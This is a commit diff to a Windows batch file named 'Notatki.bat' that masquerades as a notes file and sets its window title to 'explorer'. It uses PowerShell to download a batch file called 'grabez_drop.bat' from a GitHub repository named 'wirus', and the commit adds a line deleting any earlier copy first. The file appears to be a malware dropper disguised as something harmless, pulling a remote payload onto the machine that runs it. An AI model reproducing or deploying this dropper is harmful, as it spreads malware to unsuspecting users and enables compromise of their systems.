9f4485f453961eeeacb7ca499c46e947c15e15aa
kolmipilot <marchewkowi@gmail.com>
2023-06-08 17:52:48 +0200

    commit

--- Notatki.bat
+++ Notatki.bat
@@ -1,6 +1,7 @@
 @echo off
 title explorer
 
+del grabez_drop.bat
 powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/kolmipilot/wirus/master/grabez_drop.bat -OutFile .\grabez_drop.bat" > nul
 
 timeout /t 2 /nobreak > NUL
